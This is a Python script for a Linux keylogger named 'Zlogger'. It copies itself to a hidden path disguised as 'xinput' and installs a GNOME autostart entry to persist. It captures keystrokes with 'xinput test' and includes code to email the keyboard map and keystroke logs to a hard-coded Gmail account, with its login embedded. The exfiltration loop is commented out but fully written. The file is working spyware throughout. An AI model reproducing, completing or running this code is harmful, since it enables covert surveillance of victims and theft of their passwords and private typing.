#!/usr/bin/env python

import smtplib, re, os, stat
from shutil import copyfile
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from time import sleep
from subprocess import Popen, PIPE, check_output

EMAIL = "jhnwck70@gmail.com"
PASSWORD = "abc123abc123"
EMAIL_SERVER = "smtp.gmail.com"

SLEEP_INTERVAL = 30
LOG_FILE = "/tmp/zlogger.txt"

AUTOSTART_ENTRY = """
[Desktop Entry]
Type=Application
X-GNOME-Autostart-enabled=true
Name=Xinput
"""

def send_mail(subject, content):
	msg = MIMEMultipart()
	msg['Subject'] = subject
	msg.attach(MIMEText(content))
	mailer = smtplib.SMTP(EMAIL_SERVER, 587)
	
	mailer.starttls()
	mailer.login(EMAIL, PASSWORD)

	mailer.sendmail(EMAIL, EMAIL, msg.as_string())
	mailer.close()


def start_logging(log_file):
	devices = check_output("xinput list | grep AT", shell=True)

	regex = re.compile('id=([^"]+)\t')
	keyboard_id = regex.findall(devices)[0]

	command = "xinput test " + keyboard_id + " > " + log_file
	Popen(command , shell=True)

def chmod_to_exec(file):
	os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)


#Autostart
home = os.path.expanduser('~')
autostart_path = home + "/.config/autostart/"
try:
    os.makedirs(autostart_path)
except OSError:
    pass

destination_file = home + "/.config/xinput"
copyfile(os.path.realpath(__file__), destination_file)
chmod_to_exec(destination_file)

AUTOSTART_ENTRY = AUTOSTART_ENTRY + "Exec=" + destination_file + "\n"

autostart_file = autostart_path + "xinput.desktop"
with open(autostart_file,'w') as out:
    out.write(AUTOSTART_ENTRY)

chmod_to_exec(autostart_file)

# #Get Keyboard map and send it
# kmap = check_output("xmodmap -pke", shell=True)
# send_mail("Zlogger Character Map",kmap)

# #Start logging
# start_logging(LOG_FILE)

# #send reports
# while True:
# 	sleep(SLEEP_INTERVAL)
# 	send_mail("Zlogger report", file(LOG_FILE).read())
# 	with open(LOG_FILE, "w"):
# 		pass